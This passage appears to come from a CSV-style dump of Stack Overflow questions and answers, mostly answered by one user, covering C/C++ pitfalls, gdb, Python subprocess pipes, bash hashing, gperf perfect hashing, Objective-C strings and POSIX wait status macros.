    MaybeOstream&amp; operator&lt;&lt; (T x)
    {
        if(bOutput)
            stream &lt;&lt; x;
        return *this;
    }

    // Add other wrappers around ostream: operator void*, good(), fail(),
    // eof(), etc., which just call through to the ostream

private:
    std::ostream&amp; stream;
    bool bOutput;
}
</code></pre>
"
"<p>I have a foo.c source file which has the following function implementation:</p>

<pre><code>#include ""header.h""
void PREFIX(function_name)(){
   ...
}
</code></pre>

<p>I'll copy this file into two directories (dir1 and dir2). In dir1, I have header.h like this:</p>

<pre><code>#define PREFIX(a) prefix1_ ## a
</code></pre>

<p>and in dir2, I have header.h like:</p>

<pre><code>#define PREFIX(a) prefix2_ ## a
</code></pre>

<p>Therefore, during the linking process, I'll have two different function names.</p>

<p>My problem comes up when I want to use gdb to debug this function and I need to set a breakpoint in a specific line within this function.
If I do:</p>

<pre><code>b foo.c:235
</code></pre>

<p>and 235 is a line inside the function implementation, in which function is gdb going to actually set the breakpoint? prefix1_function_name or prefix2_function_name ?</p>

<p>Is there a way to make gdb set the breakpoint on both ?</p>

<p>Thanks!</p>
","9530","","<p>Why not just try it out?  When I tried it, it set a break point in <em>both</em> files:</p>

<pre><code>(gdb) break a.c:5
Breakpoint 1 at 0x100000e87: file 3/a.c, line 5.
Breakpoint 2 at 0x100000e75: file 2/a.c, line 5.
warning: Multiple breakpoints were set.
Use the ""delete"" command to delete unwanted breakpoints.
</code></pre>

<p>If you want to break in only a specific file, just use the full path name to that file to disambiguate.</p>
"
"<p>If I have the following snippet:</p>

<pre><code>size_t num = -1;

switch(num) {
    case -1:
        printf(""Minus one!\n"");
        break;
    default:
        printf(""Not minus one!\n"");
}
</code></pre>

<p>Why is it that the program prints <code>Minus One!</code>? Is <code>num</code> casted to a <code>size_t</code> in the <code>switch</code> statement? Is this behavior defined?</p>
","9530","","<p>Yes, this behavior is defined.  The values are cast to <code>size_t</code> as you'd expect.  From C99 §6.8.4.2/5:</p>

<blockquote>
  <p>The integer promotions are performed on the controlling expression. The constant expression in each <code>case</code> label is converted to the promoted type of the controlling expression. If a converted value matches that of the promoted controlling expression, control jumps to the statement following the matched <code>case</code> label.</p>
</blockquote>

<p>The ""controlling expression"" is the expression appearing inside the parentheses after the <code>switch</code> keyword, i.e. <code>num</code> in this case.</p>

<p>So, the <code>-1</code> in the case label is converted to <code>size_t</code> (the promoted type of <code>num</code>).  Since the value of <code>num</code> is just that, the code in that case statement is executed.</p>
"
"<p>In C is it undefined behaviour to call a 3rd party library function (not provided as source code)?</p>

<p>By this I mean:</p>

<ul>
<li>Not calls to the Standard C Library.</li>
<li>Not calls to an additional library provided by the compiler vendor.</li>
<li>Not calls to a library created by me using the C compiler.</li>
<li>Not calls to a 3rd party library that was provided as source code and where I have compiled the library myself using the C compiler.</li>
<li>Not calls to a precompiled 3rd party library that I know was compiled using exactly the same C compiler that I am using.</li>
</ul>

<p>In other words I am interested in scenarios that rely in some way on ABI compatibility (perhaps between different C compilers, or different versions of the same C compiler, or between compilers of different languages). The C standard has nothing to say on how to achieve ABI compatibility.</p>

<p>I am primarily interested in C90, which states in Section 3.16:</p>

<blockquote>
  <p>Undefined behavior is otherwise indicated in this International Standard by the words ""undefined behavior"" or by the omission of any explicit definition of behavior.</p>
</blockquote>

<p>It could be argued that calling a 3rd party library function is undefined behaviour because of the ""omission of any explicit definition"" part of the clause above.</p>

<p>It could also be argued that calling a 3rd party library function is not implementation defined behaviour because the library is not provided by the compiler vendor.</p>

<p>If calling a 3rd party library function is indeed undefined behaviour, it means that there are 2 degrees of undefined behaviour in C, and that advice to avoid all undefined behaviour is over simplistic. How do we know which types of undefined behaviour are ""OK"" and which types may be viewed by the compiler writer as an opportunity to do ""anything"" in the interests of improving benchmark results?</p>

<p>EDIT: I have edited the question and the title to clarify that I am excluding cases where I compile the library myself. I don't think this changes the meaning of the question because I would argue that most 3rd party libraries are used in precompiled form.</p>
","9530","","<p>No.  How could anyone possibly write code if that were so?</p>

<p>If you're using a third-party library, its documentation will tell you what behavior is defined and what behavior is not defined.  If it has no documentation, infer its behavior from its source code.  If it has no source code either, then you're on your own, and complain to the people who provided you that library.</p>
"
"<p>Maybe there's someone out in the ether that can help me with this one. (I have seen a number of similar questions to this on SO, but none deal with both standard out and standard error or deal with a situation quite like mine, hence this new question.)</p>

<p>I have a python function that opens a subprocess, waits for it to complete, then outputs the return code, as well as the contents of the standard out and standard error pipes. While the process is running, I'd like to also display the output of both pipes as they are populated. My first attempt has resulted in something like this:</p>

<pre><code>process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

stdout = str()
stderr = str()
returnCode = None
while True:
    # collect return code and pipe info
    stdoutPiece = process.stdout.read()
    stdout = stdout + stdoutPiece
    stderrPiece = process.stderr.read()
    stderr = stderr + stderrPiece
    returnCode = process.poll()

    # check for the end of pipes and return code
    if stdoutPiece == '' and stderrPiece == '' and returnCode != None:
        return returnCode, stdout, stderr

    if stdoutPiece != '': print(stdoutPiece)
    if stderrPiece != '': print(stderrPiece)
</code></pre>

<p>There's a couple problems with this though. Because <code>read()</code> reads until an <code>EOF</code>, the first line of the <code>while</code> loop will not return until the subprocess closes the pipe.</p>

<p>I could replace the <code>read()</code> in favor of <code>read(int)</code> but the printed output is distorted, cut off at the end of the read characters. I could <code>readline()</code> as a replacement, but the printed output is distorted with alternating lines of output and errors when there are many of both that occur at the same time.</p>

<p>Perhaps there's a <code>read-until-end-of-buffer()</code> variant that I'm not aware of? Or maybe it can be implemented?</p>

<p>Maybe it's best to implement a <code>sys.stdout</code> wrapper as suggested in this <a href=""http://stackoverflow.com/questions/107705/python-output-buffering/107717#107717"">answer to another post</a>? I would only want to use the wrapper in this function, however.</p>

<p>Any other ideas from the community?</p>

<p>I appreciate the help! :)</p>

<p><em>EDIT</em>: The solution really should be cross-platform, but if you have ideas that aren't, please share them away to keep the brainstorming going.</p>

<hr>

<p>For another one of my python subprocess head scratchers, take a look at another of my questions on <a href=""http://stackoverflow.com/q/7560708/608905"">accounting for subprocess overhead in timing</a>.</p>
","9530","","<p>Make the pipes non-blocking by using <a href=""http://docs.python.org/library/fcntl.html#fcntl.fcntl""><code>fcntl.fcntl</code></a>, and use <a href=""http://docs.python.org/library/select.html#select.select""><code>select.select</code></a> to wait for data to become available in either pipe.  For example:</p>

<pre><code># Helper function to add the O_NONBLOCK flag to a file descriptor
def make_async(fd):
    fcntl.fcntl(fd, fcntl.F_SETFL, fcntl.fcntl(fd, fcntl.F_GETFL) | os.O_NONBLOCK)

# Helper function to read some data from a file descriptor, ignoring EAGAIN errors
def read_async(fd):
    try:
        return fd.read()
    except IOError, e:
        if e.errno != errno.EAGAIN:
            raise e
        else:
            return ''

process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
make_async(process.stdout)
make_async(process.stderr)

stdout = str()
stderr = str()
returnCode = None

while True:
    # Wait for data to become available 
    select.select([process.stdout, process.stderr], [], [])

    # Try reading some data from each
    stdoutPiece = read_async(process.stdout)
    stderrPiece = read_async(process.stderr)

    if stdoutPiece:
        print stdoutPiece,
    if stderrPiece:
        print stderrPiece,

    stdout += stdoutPiece
    stderr += stderrPiece
    returnCode = process.poll()

    if returnCode != None:
        return (returnCode, stdout, stderr)
</code></pre>

<p>Note that <code>fcntl</code> is only available on Unix-like platforms, including Cygwin.</p>

<p>If you need it to work on Windows without Cygwin, it's doable, but it's much, much tougher.  You'll have to:</p>

<ul>
<li>Use the <a href=""http://sourceforge.net/projects/pywin32/"">pywin32</a> library to call through to the native Win32 API</li>
<li>Use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa365787%28v=VS.85%29.aspx""><code>SetNamedPipeHandleState</code></a> with <code>PIPE_NOWAIT</code> to make the stdout and stderr pipes non-blocking</li>
<li>Use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms687025%28v=vs.85%29.aspx""><code>WaitForMultipleObjects</code></a> instead of <code>select</code> to wait for data to become available</li>
<li>Use <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa365467%28v=vs.85%29.aspx""><code>ReadFile</code></a> to read the data</li>
</ul>
"
"<p>I'm having problems with C++ code loaded via dlopen() by a C++ CGI server. After a while, the program crashes unexpectedly, but consistently at memory management function call (such as free(), calloc(), etc.) and produces core dump similar to this:</p>

<pre><code>#0  0x0000000806b252dc in kill () from /lib/libc.so.6
#1  0x0000000804a1861e in raise () from /lib/libpthread.so.2
#2  0x0000000806b2416d in abort () from /lib/libc.so.6
#3  0x0000000806abdb45 in _UTF8_init () from /lib/libc.so.6
#4  0x0000000806abdfcc in _UTF8_init () from /lib/libc.so.6
#5  0x0000000806abeb1d in _UTF8_init () from /lib/libc.so.6
... the rest of the stack
</code></pre>

<p>Has anyone seen something like this before?</p>

<p>What is _UTF8_init() and why would memory management functions call it?</p>
","9530","","<p>That smells like a corrupted heap, likely due to a buffer overrun somewhere in your code.  Try running your program with <a href=""http://valgrind.org/"" rel=""nofollow"">Valgrind</a> and look for any errors or warnings it emits.</p>
"
"<p>How is it possible to use Windows thread pools from plain <code>C</code>, or is <code>C++</code> required? Is it OK to use them with MinGW?</p>
","9530","","<p>The <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms686766%28v=vs.85%29.aspx"" rel=""nofollow"">Thread Pool API</a> is a C API, it can be used either in C or C++.  Yes, it's ok to use them with MinGW—MinGW uses the same C runtime library that Microsoft's compilers use (unlike Cygwin, which uses the GNU C library).</p>
"
"<p>What is the simplest way in C to convert an EBCDIC-encoded string to its ASCII equivalent in-place.</p>

<p>The only characters that need to be converted are the space, alphanumerics, and from the set <code>&lt;=&gt;()+-*/&amp;|!$#@.,;%_?""</code>. All other characters can simply be replaced with <code>.</code>.</p>

<p>The function signature will basically be:</p>

<pre><code>void ebcdicToAscii (char *s);
</code></pre>

<p>At the moment, I'm leaning towards a series of lookup tables and multiple <code>if</code> statements for the various EBCDIC sections, but I wonder if there's a better way.</p>
","9530","","<p>The simplest would be to use a 256-entry lookup table.  Here's one way to generate such a table using Python:</p>

<pre><code>print 'static const char kEbcdicToAscii[256] = {';
for i in range(256):
    print '    %d,' % ord(chr(i).decode('cp500'))
print '};'
</code></pre>

<p>Then to decode:</p>

<pre><code>void ebcdicToAscii(char *s)
{
    while(*s)
        *s++ = kEbcdicToAscii[(unsigned char)*s];
}
</code></pre>

<p>This will also likely be the fastest method, since the 256-byte table will easily fit in your L1 cache.  If you really want to convert other characters to <code>'.'</code> instead of converting them properly, then modify the table like so:</p>

<pre><code>import string

print 'static const char kEbcdicToAscii[256] = {';
for i in range(256):
    asc = chr(i).decode('cp500')
    if asc not in string.ascii_letters + string.digits + ' &lt;=&gt;()+-*/&amp;|!$#@.,;%_?""':
        asc = '.'
    print '    %d,' % ord(asc)
print '};'
</code></pre>
"
"<p>Here's what I have:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv)
{

    while(*argv++ != 0)
    {
            printf(""Argument!\n"");
            printf(""%s %d\n"",*argv,(int)strlen(*argv));
            int i = 0;

            while(*argv[i])
            {
                    printf(""char!\n"");
                    printf(""%c\n"",*argv[i]);
                    i++;
            }

            printf(""End of for loop\n"");
    }

    return 0;
}
</code></pre>

<p>When I run ./a.out test, the output is:</p>

<pre><code>Argument!
test 4
char!
t
Segmentation Fault
</code></pre>

<p>I've been staring at this for a few hours. Why won't my program print each command line argument character by character? </p>

<p>I'm new to C, and the array-pointer duality, so I wouldn't be surprised if that were the problem. Any help is appreciated!</p>
","9530","","<p>You have two problems.  One, you're incrementing <code>argv</code> to point to the next string at the beginning of each iteration of the outer <code>while</code> loop.  When this gets to the last argument, <code>argv</code> will be <code>NULL</code> entering the last iteration, which will segfault when you dereference it.</p>

<p>Secondly, in the inner loop, you have the order of operations mixed.  <code>*argv[i]</code> indexes into <code>argv</code> and then dereferences it, which takes the first character of the <code>i</code>th string, starting from the current index.  When <code>i</code> exceeds the number of remaining arguments, this will also segfault.</p>

<p>Rewrite your outer loop as <code>while(*(++argv))</code> (the parentheses around <code>++argv</code> are optional but helpful) so that <code>argv</code> gets incremented <em>before</em> the null check; if you also want to print out the program name (in <code>argv[0]</code>), then move the increment to the end of the loop instead of in the loop condition.</p>

<p>Rewrite your inner loop as <code>while((*argv)[i])</code>, and rewrite the inner <code>printf</code> statement to also use <code>(*argv)[i]</code>, so that the current argument gets dereferenced and then indexed into in that order.</p>
"
"<p>I searched and found a very similar question here  <a href=""http://stackoverflow.com/questions/6946515/syntax-error-when-trying-to-define-multiple-functions-in-python"">Syntax Error when trying to define multiple functions in python?</a></p>

<p>but the question wasn't really answered</p>

<p>I am getting a syntax error at the second ""def""  . My indentation may be messed up here because I cannot figure out the formatting in this place....BUT it is correct in my program, indentation is not the issue.</p>

<pre><code>def encryptChar(ch, key):
    newOrd = ord(ch) + key % 26
    if ord(ch) &lt; 65:
        newOrd = ord(ch)
    elif ord(ch) &lt; 91:
        if newOrd &gt; 90:
            newOrd = newOrd - 26
        elif newOrd &gt; 122:
            newOrd = newOrd - 26
    newch = chr(newOrd)
    return newch

def encryptString(string, key):
    newString = """"
    for i in range(len(string)):
         newString += encryptChar(string[i], key)
    return newString

def decryptString(string, key):
    newString = """"
    for i in range(len(string)):
         newString += encryptChar(string[i], -1*key)
    return newString
</code></pre>

<p>I'm GUESSING it has something to do with the functions all being top level. But how do I fix it? This is Python 2.7.  (I could include the top function inside the other 2, but I am still left with 2 top level)</p>

<p>Thanks for any help!</p>
","9530","","<p>The error message says exactly what's wrong:</p>

<pre><code>  File ""test.py"", line 17
    return newString
                   ^
IndentationError: unindent does not match any outer indentation level
</code></pre>

<p>On the line <code>return newString</code>, the indentation level does not match the previous indentation level of the <code>for i in range(len(string))</code> line.</p>

<p>You need to fix your indentation on the whole—use a constant indentation level (e.g. 2 or 4 spaces) throughout all your code.  Be consistent.  Right now, your indentation is all over the place—every time you indent, it's to a different level.</p>

<p>Secondly, don't use the name <code>string</code> for a variable.  <code>string</code> is also the name of a standard Python module, so you will be unable to use that module with your code, and you will confuse other people reading your code (also don't use <code>str</code>, since that's the name of a built-in function).</p>
"
"<p>Can anyone explain how python 2.6 could be getting run by default on my machine? It looks like  <code>python</code> points to 2.7, so it seems like <code>which</code> isn't giving me correct information.</p>

<pre><code>~&gt; python --version
Python 2.6.5
~&gt; which python
/opt/local/bin/python
~&gt; /opt/local/bin/python --version
Python 2.7.2
~&gt; ls -l /opt/local/bin/python
lrwxr-xr-x  1 root  admin  24 12 Oct 16:02 /opt/local/bin/python -&gt; /opt/local/bin/python2.7
</code></pre>

<p>When I generate an error, I see what's really getting run. Why could this be?</p>

<pre><code>~&gt; python -error-making-argument
Unknown option: -e
usage:     /Library/Frameworks/Python.framework/Versions/2.6/Resources/Python.app/Contents/MacOS/Python [option] ... [-c cmd | -m mod | file | -] [arg] ...
Try `python -h' for more information.
</code></pre>

<p>And how can I correct it?</p>

<p><strong>----Edit:----</strong></p>

<p>From suggestions in comments:</p>

<pre><code>~&gt; alias
alias cp='cp -i'
alias gcc='gcc -Wall'
~&gt; type python
python is /opt/local/bin/python
</code></pre>
","9530","","<p>Bash uses an <a href=""http://www.cyberciti.biz/tips/how-linux-or-unix-understand-which-program-to-run-part-i.html#hashtables"">internal hash table</a> to optimize <code>$PATH</code> lookups.  When you install a new program with the same name as an existing program (<code>python</code> in this case) earlier in your <code>$PATH</code>, Bash doesn't know about it and continues to use the old one.  The <code>which</code> executable does a full <code>$PATH</code> search and prints out the intended result.</p>

<p>To fix this, run the command <code>hash -d python</code>.  This will delete <code>python</code> from Bash's hash table and force it to do a full <code>$PATH</code> search the next time you invoke it.  Alternatively, you can also run <code>hash -r</code> to clear out the hash table entirely.</p>

<p>The <a href=""http://www.gnu.org/s/bash/manual/bash.html#Bash-Builtins""><code>type</code>  builtin</a> will tell you how a given command will be interpreted.  If it says that a command is hashed, that means that Bash is going to skip the <code>$PATH</code> search for the executable.</p>
"
"<p>I have a bunch of strings as keys. Something like...</p>

<pre><code>AAAA ABBA ACEA ALFG
...
...
ZURF [AAA _JFS aKDJ
</code></pre>

<p>They are all unique combination of any 4 characters and are all the same length. There are hundreds of thousands of these. I want to perform a lookup and retrieve the value associated with each string.</p>

<p>I currently have it implemented as a hash table, but the main concern is collisions (I've implemented all of the strategies on Wiki).</p>

<p>I am thinking of implementing this as a prefix tree. Given the parameters though (unique, fixed length), I'm wondering if there is a out-of-the-box data structure I can't think of that would be best suited for this...</p>

<p>EDIT: Additionally, all possible combinations are populated once by a data file. Afterwards, lookups happen at wire speed.</p>
","9530","","<p>Since you know all of the strings ahead of time, you can use <a href=""http://www.gnu.org/s/gperf/"" rel=""nofollow"">gperf</a> to generate a <a href=""http://en.wikipedia.org/wiki/Perfect_hash_function"" rel=""nofollow"">perfect hash function</a>, which has no collisions.  For example, with the four input strings <code>AAAA ABBA ACEA ALFG</code>, it generated the following hash function (using the command line <code>gperf -L ANSI-C input.txt</code>):</p>

<pre><code>static unsigned int
hash (register const char *str, register unsigned int len)
{
  static unsigned char asso_values[] =
    {
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12,  7,  2,  5, 12, 12,
      12, 12, 12, 12, 12, 12,  0, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12, 12, 12, 12, 12,
      12, 12, 12, 12, 12, 12
    };
  return len + asso_values[(unsigned char)str[1]];
}

const char *
in_word_set (register const char *str, register unsigned int len)
{
  static const char * wordlist[] =
    {
      """", """", """", """",
      ""ALFG"",
      """",
      ""ABBA"",
      """", """",
      ""ACEA"",
      """",
      ""AAAA""
    };

  if (len &lt;= MAX_WORD_LENGTH &amp;&amp; len &gt;= MIN_WORD_LENGTH)
    {
      register int key = hash (str, len);

      if (key &lt;= MAX_HASH_VALUE &amp;&amp; key &gt;= 0)
        {
          register const char *s = wordlist[key];

          if (*str == *s &amp;&amp; !strcmp (str + 1, s + 1))
            return s;
        }
    }
  return 0;
}
</code></pre>

<p>Which requires a single table lookup, a length comparison, and a string comparison.  If you know for sure that the word you're hashing is one of your source words, then you can skip the string comparison.</p>

<p>Expanding the input size from 4 to 10000 randomly-generated strings increases the hash function to just 4 table lookups plus a length comparison and string comparison.  But, since the string comparison has to store every source string in it, this comes out to a very large table in the compiled object file (1.4 MB).  If you don't need to do the string comparison, you can omit that table.</p>
"
"<p>I'm a complete newb to C++, but not to Java, C#, JavaScript, VB. I'm working with a default C++ console app from Visual Studio 2010. </p>

<p>In trying to do a printf I get some strange characters. Not the same each time which tells me they may be looking at different memory location each time I run it.</p>

<p>Code:  </p>

<pre><code>#include ""stdafx.h""
#include &lt;string&gt;

using namespace std;

class Person
{
public:
    string first_name;
};

int _tmain(int argc, _TCHAR* argv[])
{
    char somechar;
    Person p;
    p.first_name = ""Bruno"";

    printf(""Hello %s"", p.first_name);
    scanf(""%c"",&amp;somechar);
    return 0;
}
</code></pre>
","9530","","<p>You cannot pass C++ <code>std::string</code> objects into <code>printf</code>.  <code>printf</code> only understands the primitive types like <code>int</code>, <code>float</code>, and <code>char*</code>.  Your compiler <em>should</em> be giving you a warning there; if it's not, crank up your warning level.</p>

<p>Since you're using C++, you really should be using <code>std::cout</code> for text output, and that does understand <code>std::string</code> objects.  If you really have to use <code>printf</code> for some reason, then convert the <code>std::string</code> to a <code>const char*</code> by calling the <code>c_str()</code> method on it.</p>
"
"<p>I wrote a monolithic designed program which is quite rough on the processors needs. And as I have a dual-core I figured that one CPU should therefore be always at 100%. But both my CPUs are on 100% all the time. Now I am guessing that my compiler somehow turned my monolithic application in a threaded one. What are the limits of those optimization feature and when is it still needed to explicit make something threaded?</p>

<p>I am using the gcc on Ubuntu linux 64-Bit</p>
","9530","","<p>It doesn't, at least not without using something like <a href=""http://supertech.csail.mit.edu/cilk/"" rel=""nofollow"">Cilk</a>.  You must be inadvertently using multiple threads (or processes) without realizing it.  Perhaps you're using a third-party library that creates an extra thread or two in your process?</p>

<p><strong>[EDIT]</strong></p>

<p>As per the comments, use a program like <a href=""http://linux.die.net/man/1/top"" rel=""nofollow""><code>top(1)</code></a> to verify that is in fact your program's process that is using both CPUs at 100%.  In your case, the XORG process is jumping to 100% because your program is producing a large amount of output.</p>
"
"<p>Hi I'm new to objective c and I see this quite often when I read the developer documentation. </p>

<p>There are methods named setEditable or setWhateverName and isEditable or isWhateverName</p>

<p>What is the difference between the set""blabla"" and is""blabla""</p>

<p>and example would be for the NSButton Class</p>

<pre><code>-setAlternateTitle
</code></pre>

<p>and <code>-alternateTitle</code></p>

<p>or </p>

<p>NSImageView class</p>

<pre><code>-isEditable
</code></pre>

<p>and <code>-setEditable:</code></p>

<p>I think that the latter in both examples takes a paramater and the former ones do not. Is this correct?</p>
","9530","","<p>These are called <a href=""http://en.wikipedia.org/wiki/Mutator_method"" rel=""nofollow""><em>mutator methods</em></a>.  They are methods you use for accessing various <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjectiveC/Chapters/ocProperties.html#//apple_ref/doc/uid/TP30001163-CH17"" rel=""nofollow"">Objective-C <em>properties</em></a>, which are basically class member variables (so-called <em>ivars</em> or <em>instance variables</em>), except you can't access them directly.  You can only access the ivars through the <em>setter</em> and <em>getter</em> methods.</p>

<p>The <em>getter</em> method gets the current value of the property.  It's usually given a name identical to the property in question (such as <code>-alternateTitle</code>) for non-boolean properties, or the name with an <code>is</code> prefix (such as <code>-isEditable</code>) for boolean properties.</p>

<p>The <em>setter</em> method sets a new value for the property.  It's usually given a name of the property name prefixed with <code>set</code>, e.g. <code>-setEditable:</code>.</p>

<p>For example:</p>

<pre><code>if ([myObject isEditable])  // Is the object editable?
    /* do stuff */ ;
...
[myObject setEditable:YES];  // Make it editable
</code></pre>
"
"<p>I have the function below that validates the return of another function (function searchPlaces that returns NSString). When I run it, it seems that the if clause is not being called, because the NSLog(@""Function Return: %@"",nova url); appears in Console.</p>

<p>Can someone tell me if there's any mistake in the code? (For sure there is a mistake!)</p>

<pre><code>- (void) buttonPushRandomViewController1 {

    UIViewController *randomViewController = [self randomViewController3];

    NSString *novaurl = [self searchPlaces];
    NSLog(@""Function Return: %@"",novaurl);

    if (novaurl == @""OK"") {
        randomViewController.title = @""Resultado"";
        [self.master pushViewController:randomViewController animated:YES];

        NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:novaurl]];
        [webView loadRequest:request];
    }else if (novaurl == @""ZERO_RESULTS"") {
        UIAlertView *zeroResults = [[UIAlertView alloc] initWithTitle: @""Ops!"" message: @""Sorry, nothing found!"" 
                                                             delegate: self cancelButtonTitle: @""OK"" otherButtonTitles: nil];
        [zeroResults show];
        [zeroResults release];
    }
}
</code></pre>

<p>Thanks in advance!</p>
","9530","","<p>You should not comparing <code>NSString</code>s with the <code>==</code> operator.  The <code>==</code> operator performs <em>reference equality</em> on Objective-C object types: it only returns true if both operands refer to the exact same object.  Even if two strings are copies of each other, <code>==</code> will return false if they refer to different instances.</p>

<p>You want to use <em>value equality</em> instead.  You can compare strings using the <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSString_Class/Reference/NSString.html"" rel=""nofollow""><code>-isEqualToString:</code></a> method:</p>

<pre><code>if ([novaurl isEqualToString:@""OK""]) {
    ...
}
</code></pre>
"
"<p>I have a really weird problem. Basically just convert a char to nsstring and store them in an nsmutable array.</p>

<p>But the code runs ok on simulator, but crash on device.</p>

<p>Here is the crash code, </p>

<pre><code>char t = 'A' + i;
NSString* alphabetString = [NSString stringWithUTF8String:&amp;t]; //substringToIndex:1];
[tempArray addObject:alphabetString];
</code></pre>

<p>Basically the stringWithUTF8String will return NULL on device, but return valid value on simulator.</p>

<pre><code>The device is an iPhone 4s. 

I did not see any notification of changes on NSString stringwithutf8string on iOS5 release.

 Thanks.
</code></pre>
","9530","","<p>You can't pass the address of a single <code>char</code> value to <code>-stringWithUTF8String</code>.  That function is expecting a null-terminated string, and you're not passing it one.  This results in <em>undefined behavior</em>: anything at all could happen.  It might appear to succeed, it might fail benignly, or it might erase your file system.  But more likely, it will just crash your program.</p>

<p>You should create a two-character array that's null-terminated instead:</p>

<pre><code>char t[2] = {'A' + i, 0};  // Two-character null-terminated array
NSString* alphabetString = [NSString stringWithUTF8String:t];
</code></pre>

<p>Alternatively, you can also use <code>-stringWithFormat:</code> with the <code>%c</code> format specifier to get a string containing a single character:</p>

<pre><code>NSString* alphabetString = [NSString stringWithFormat:@""%c"", 'A' + i];
</code></pre>
"
"<p>I'm trying to convert the character string ""2011-12-12"" into a time value using strptime. Can someone explain why this doesn't work? </p>

<p>According to the docs: </p>

<blockquote>
  <p>The format is composed of zero or more directives. Each directive is composed of one of the following: one or more white-space characters (as specified by isspace()); an ordinary character (neither '%' nor a white-space character); or a conversion specification.</p>
</blockquote>

<pre><code>if( strptime(date, ""%y-%m-%d"", &amp;tm) != NULL)
</code></pre>
","9530","","<p>Take a look at <a href=""http://linux.die.net/man/3/strptime"" rel=""nofollow"">the documentation</a>.  The <code>%y</code> specifier is for two-digit years, without the century, whereas <code>%Y</code> is for the full year, including the century.  When you use <code>%y</code> with your input string, it parses the year as <code>20</code>, and then since the rest of the string (<code>11-12-12</code>) doesn't match <code>-%m-%d</code>, parsing fails.</p>

<p>Either change your format string to use <code>%Y</code> (recommended), or change your input to use two-digit dates (strongly <strong>not</strong> recommended).</p>
"
"<p>So here's my dilemma: Why when I <code>fork();</code> a child of a process and it ends,  the returned <code>&amp;status</code> of the child is shifted to the left by 8 bit? </p>

<p>For example let's say i have <code>exit(4);</code> at the end of the forked child , my status in the <code>wait(&amp;status);</code>
of the father process gets me <code>0x400</code>.</p>

<p>so here is some code that illustrates what I mean</p>

<pre><code>#include &lt;stdio.h&gt;

main() {
  int n, status, cpid;

  printf(""Parent pid = %d\n"",  getpid());

  n = fork();

  if (n != 0) {
     //  parent code
     printf (""I'm the parent with PID %d \t fork returned %d \t my parent is %d\n"", getpid(), n, getppid()); 
     status = 0;
     sleep(5);      // verify status of child
     cpid = wait(&amp;status);

     // so when i printf the hex value of status it gets shifted 
     printf(""I received from my child %d this information %x\n"", cpid, status);

   } else {
        // child code
        printf (""I'm the child with PID %d \t fork returned %d \t my parent is %d\n"", getpid(), n, getppid());
        sleep(20);
        printf(""Child complete\n"");
        status=12345;

        // the line that returns the shifted value
        exit(4);
     }

     printf(""Parent complete\n"");
     exit(15);
}
</code></pre>
","9530","","<p>Read the documentation on <a href=""http://linux.die.net/man/3/wait"" rel=""nofollow""><code>wait(3)</code></a>.  The value returned is a 32-bit integer containing the exit status (if the process exited normally), as well as a number of flag bits.  To determine if the process exited normally, use the <code>WIFEXITED()</code> macro.  If that returns true, then use the <code>WEXITSTATUS()</code> macro to get the actual exit status:</p>

<pre><code>int status;
if(wait(&amp;status) &gt; 0)
{
    // Did the process exit normally?
    if(WIFEXITED(status))
    {
        // This is the value you really want
        int actual_status = WEXITSTATUS(status);
        ...
    }
}
</code></pre>
"
"<p>this is a function in my code:</p>

<pre><code>bool same_community(string s1, string s2)//check if student 1 &amp; student 2 are in the same community
{
for(int i=0;i&lt;number_of_communities;i++)    
    if(community[i].contains(s1) &amp;&amp; community[i].contains(s2))
    {
        return true;
        break;
    }
return false
}
</code></pre>

<p>is the break after return true needed?</p>
","9530","","<p>No.  It's dead code and will very likely be removed by your compiler's optimizer.  Remove it, since it reduces your code's readability.</p>
"
"<p>How can I write some lines to a file in a bash script?  </p>

<p>I want to write the following into a file <code>~/.inputrc</code></p>

<pre><code>""\e[A"": history-search-backward
""\e[B"": history-search-forward
""\e[C"": forward-char
""\e[D"": backward-char
</code></pre>

<p>Currently I have this working but somewhat ugly method, and I'm sure there should be a better way.</p>

<pre><code>#!/bin/sh
echo \""\\e[A\"": history-search-backward &gt; ~/.inputrc 
echo \""\\e[B\"": history-search-forward &gt;&gt; ~/.inputrc
echo \""\\e[C\"": forward-char &gt;&gt; ~/.inputrc
echo \""\\e[D\"": backward-char &gt;&gt; ~/.inputrc
</code></pre>
","9530","","<p>Use a <a href=""http://www.gnu.org/s/bash/manual/bash.html#Redirections"" rel=""nofollow"">here document</a>:</p>

<pre><code>#!/bin/bash
cat &gt;~/.inputrc &lt;&lt;EOF
""\e[A"": history-search-backward
""\e[B"": history-search-forward
""\e[C"": forward-char
""\e[D"": backward-char
EOF
</code></pre>

